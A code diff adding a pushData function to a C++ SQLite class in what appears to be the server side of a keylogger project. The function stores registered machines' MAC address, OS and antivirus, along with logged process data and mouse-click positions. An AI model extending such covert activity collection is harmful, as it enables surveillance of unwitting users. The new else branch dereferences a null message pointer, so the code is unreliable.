@@ -99,6 +99,32 @@ void spider::Sqlite::removeEntryRegister(int id)
   execute(querry.c_str());
 }
 
+void spider::Sqlite::pushData(t_unserialized data)
+{
+  if (data.register_)
+    addEntryRegister(data.register_->mac.c_str(),
+		     data.register_->os.c_str(),
+		     data.register_->antivirus.c_str());
+  else if (data.message)
+    addEntryLog(data.message->timestamp.c_str(),
+		data.message->process.c_str(),
+		data.message->data.c_str());
+  else
+  {
+    std::ostringstream strstream;
+    std::string		querry;
+
+    strstream << "Click on " << data.mouse->keytype <<
+	      ", at position x: " << data.mouse->x <<
+	      ", and y: " << data.mouse->y << ".";
+    querry = strstream.str();
+    addEntryLog(data.message->timestamp.c_str(),
+		data.message->process.c_str(),
+		querry.c_str());
+  }
+
+}
+
 void spider::Sqlite::addEntryLog(const char *time, const char *proccess,
 			      const char *message)
 {
